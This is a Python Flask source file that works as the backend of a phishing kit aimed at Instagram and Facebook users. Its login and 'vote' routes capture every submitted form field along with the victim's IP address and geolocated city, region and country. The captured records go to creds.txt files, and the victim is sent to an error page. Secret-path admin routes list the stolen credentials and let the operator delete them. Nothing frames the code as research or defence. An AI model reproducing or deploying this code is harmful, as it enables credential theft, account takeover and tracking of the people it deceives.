from flask import Flask, redirect, request, render_template
import os
from datetime import datetime
from json import dumps, loads
import requests

##################### CONFIGURATION ##########################

REDIRECT_URL = 'error'  # site to redirect to
REDIRECT_URL2 = 'error'  # site to redirect to
locate = "suobyiyUnvL99f/"
locate2 = "7wHFjPBSVisuob/"
view = os.getenv('USER')

###############################################################

app = Flask(__name__)
app.debug = True  # Enable debug mode

@app.errorhandler(404)
def page_not_found(e):
    return '404 Not Found'

@app.errorhandler(500)
def internal_server_error(e):
    return '500 Internal Server Error'

##########################First LG##########################

@app.route('/login/', methods=["GET", "POST"])
def login_page():
    try:
        if request.method == "POST":
            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

            alldata = {i + ": ": request.form[i] for i in request.form}

            alldata.update({
                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
                'account type: ': "INSTAGRAM",
                'ip: ': ip_address,
                "city: ": response.get("city"),
                "region: ": response.get("region"),
                "country: ": response.get("country_name")
            })

            with open('creds.txt', 'r+') as creds:
                content = creds.read()
                creds.seek(0, 0)
                creds.write(dumps(alldata).rstrip('\r\n') + '\n' + content)

        return redirect(request.referrer + "error")
    except Exception as e:
        app.logger.error(f"Error in login_page: {e}")
        return internal_server_error(e)

@app.route('/login2/', methods=["GET", "POST"])
def login_page2():
    try:
        if request.method == "POST":
            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

            alldata = {i + ": ": request.form[i] for i in request.form}

            alldata.update({
                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
                'account type: ': "FACEBOOK",
                'ip: ': ip_address,
                "city: ": response.get("city"),
                "region: ": response.get("region"),
                "country: ": response.get("country_name")
            })

            with open('creds.txt', 'r+') as creds:
                content = creds.read()
                creds.seek(0, 0)
                creds.write(dumps(alldata).rstrip('\r\n') + '\n' + content)

        return redirect(request.referrer + "error")
    except Exception as e:
        app.logger.error(f"Error in login_page2: {e}")
        return internal_server_error(e)

@app.route("/" + locate)
def index():
    try:
        with open('creds.txt', 'r') as creds:
            data = creds.read().splitlines()
        return render_template('index.html', data=data, loads=loads, locate=locate, view=view)
    except Exception as e:
        app.logger.error(f"Error in index: {e}")
        return internal_server_error(e)

@app.route("/delete" + locate + "<lineno>")
def delete(lineno):
    try:
        # list to store file lines
        lines = []
        # read file
        with open("creds.txt", 'r') as fp:
            # read and store all lines into list
            lines = fp.readlines()

        # Write file
        with open("creds.txt", 'w') as fp:
            # iterate each line
            for number, line in enumerate(lines):
                if number != int(lineno):
                    fp.write(line)

        return redirect(f'https://{view}.pythonanywhere.com/' + locate)
    except Exception as e:
        app.logger.error(f"Error in delete: {e}")
        return internal_server_error(e)

##########################Second LG##########################

@app.route('/vote/', methods=["GET", "POST"])
def vote_page():
    try:
        if request.method == "POST":
            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

            alldata = {i + ": ": request.form[i] for i in request.form}

            alldata.update({
                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
                'account type: ': "INSTAGRAM",
                'ip: ': ip_address,
                "city: ": response.get("city"),
                "region: ": response.get("region"),
                "country: ": response.get("country_name")
            })

            with open('creds2.txt', 'r+') as creds2:
                content = creds2.read()
                creds2.seek(0, 0)
                creds2.write(dumps(alldata).rstrip('\r\n') + '\n' + content)

        return redirect(request.referrer + "error")
    except Exception as e:
        app.logger.error(f"Error in vote_page: {e}")
        return internal_server_error(e)

@app.route('/vote2/', methods=["GET", "POST"])
def vote_page2():
    try:
        if request.method == "POST":
            ip_address = request.headers.get('X-Real-IP', request.remote_addr)
            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()

            alldata = {i + ": ": request.form[i] for i in request.form}

            alldata.update({
                'time: ': datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S"),
                'account type: ': "FACEBOOK",
                'ip: ': ip_address,
                "city: ": response.get("city"),
                "region: ": response.get("region"),
                "country: ": response.get("country_name")
            })

            with open('creds2.txt', 'r+') as creds2:
                content = creds2.read()
                creds2.seek(0, 0)
                creds2.write(dumps(alldata).rstrip('\r\n') + '\n' + content)

        return redirect(request.referrer + "error")
    except Exception as e:
        app.logger.error(f"Error in vote_page2: {e}")
        return internal_server_error(e)

@app.route("/" + locate2)
def index2():
    try:
        with open('creds2.txt', 'r') as creds2:
            data2 = creds2.read().splitlines()
        return render_template('index2.html', data=data2, loads=loads, locate2=locate2, view=view)
    except Exception as e:
        app.logger.error(f"Error in index2: {e}")
        return internal_server_error(e)

@app.route("/delete" + locate2 + "<lineno2>")
def delete2(lineno2):
    try:
        # list to store file lines
        lines2 = []
        # read file
        with open("creds2.txt", 'r') as fp2:
            # read and store all lines into list
            lines2 = fp2.readlines()

        # Write file
        with open("creds2.txt", 'w') as fp2:
            # iterate each line
            for number2, line2 in enumerate(lines2):
                if number2 != int(lineno2):
                    fp2.write(line2)

        return redirect(f'https://{view}.pythonanywhere.com/' + locate2)
    except Exception as e:
        app.logger.error(f"Error in delete2: {e}")
        return internal_server_error(e)

if __name__ == '__main__':
    app.run()
